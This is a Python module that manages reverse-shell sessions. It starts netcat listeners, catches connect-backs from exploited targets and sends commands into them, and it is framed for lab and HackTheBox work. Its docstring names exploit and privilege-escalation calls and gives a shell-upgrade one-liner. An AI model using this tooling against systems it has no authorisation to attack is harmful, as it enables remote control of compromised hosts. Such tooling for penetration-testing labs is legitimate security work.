"""
Reverse-shell session manager.

execute_exploit can start an `nc -lvnp <port>` listener before firing a
payload that's expected to connect back; once the target connects, nc's own
stdin/stdout become the channel this module reads/writes for every
subsequent send_to_session / escalate_privileges call against that session.

What this deliberately does NOT do:
  - No PTY allocation, no prompt detection, no TTY upgrade. If a technique
    needs a real TTY (sudo password prompts, some interactive tools), that's
    an ordinary command sent *through* the session once it's up
    (`python3 -c 'import pty; pty.spawn("/bin/bash")'`), not something this
    module handles for you.
  - No authentication of any kind on the listener — whatever connects to
    the port gets treated as the session. Fine for a lab/HTB target you
    already control the network path to; not something to expose beyond
    that.
  - Reads are best-effort and timing-based, not prompt-aware:
    send_and_wait writes the command, drains whatever arrives on the pipe
    for `wait_s` seconds, and returns it as one blob. A command that's
    slower than wait_s needs a longer wait_s on that specific call, not a
    different tool.
"""

from __future__ import annotations

import queue
import subprocess
import threading
import time
import uuid
from dataclasses import dataclass, field


@dataclass
class ShellSession:
    session_id: str
    port: int
    proc: subprocess.Popen
    output_queue: "queue.Queue[str]" = field(default_factory=queue.Queue)
    reader_thread: threading.Thread | None = None
    stop_event: threading.Event = field(default_factory=threading.Event)
    connected: bool = False
    created_at: float = field(default_factory=time.time)


class SessionManager:
    def __init__(self, nc_binary: str = "nc", max_sessions: int = 5):
        self.nc_binary = nc_binary
        self.max_sessions = max_sessions
        self._sessions: dict[str, ShellSession] = {}

    def start_listener(self, port: int) -> ShellSession:
        if len(self._sessions) >= self.max_sessions:
            raise RuntimeError(
                f"Refusing to start another listener: {self.max_sessions} "
                f"session(s) already active ({list(self._sessions)}). Close "
                f"one first."
            )
        # `nc -lvnp <port>` listens on all interfaces by default -- correct
        # for a lab/HTB target reachable via a VPN interface (tun0 etc.);
        # no explicit bind address needed.
        proc = subprocess.Popen(
            [self.nc_binary, "-lvnp", str(port)],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=0,
        )
        session = ShellSession(session_id=str(uuid.uuid4())[:8], port=port, proc=proc)
        thread = threading.Thread(target=self._reader_loop, args=(session,), daemon=True)
        session.reader_thread = thread
        thread.start()
        self._sessions[session.session_id] = session
        return session

    def _reader_loop(self, session: ShellSession) -> None:
        stdout = session.proc.stdout
        assert stdout is not None
        while not session.stop_event.is_set():
            chunk = stdout.read(4096)  # blocks until >=1 byte or EOF
            if not chunk:
                break
            session.connected = True
            session.output_queue.put(chunk.decode(errors="replace"))
        session.connected = False

    def send_and_wait(self, session_id: str, command: str, wait_s: float = 5.0) -> str:
        session = self._require(session_id)
        if session.proc.stdin is None or session.proc.poll() is not None:
            raise RuntimeError(f"Session '{session_id}' is not writable (listener closed).")

        if command:
            session.proc.stdin.write((command + "\n").encode())
            session.proc.stdin.flush()

        deadline = time.time() + wait_s
        chunks: list[str] = []
        while time.time() < deadline:
            remaining = max(0.0, deadline - time.time())
            try:
                chunks.append(session.output_queue.get(timeout=min(0.5, remaining)))
            except queue.Empty:
                continue

        if not chunks:
            if session.connected:
                return "[no new output in the wait window]"
            return (
                f"[session '{session_id}' on port {session.port}: no "
                f"connection caught yet -- the payload may not have fired, "
                f"or the target hasn't connected back yet. Try again with "
                f"a longer wait, or re-check the exploit delivery.]"
            )
        return "".join(chunks)

    def status(self, session_id: str) -> str:
        session = self._require(session_id)
        return "connected" if session.connected else "listening (no connection yet)"

    def close(self, session_id: str) -> None:
        session = self._sessions.pop(session_id, None)
        if session is None:
            return
        session.stop_event.set()
        try:
            session.proc.terminate()
            session.proc.wait(timeout=3)
        except (ProcessLookupError, subprocess.TimeoutExpired):
            pass

    def close_all(self) -> None:
        for session_id in list(self._sessions):
            self.close(session_id)

    def _require(self, session_id: str) -> ShellSession:
        session = self._sessions.get(session_id)
        if session is None:
            raise RuntimeError(
                f"No active session '{session_id}'. Active sessions: "
                f"{list(self._sessions)}"
            )
        return session
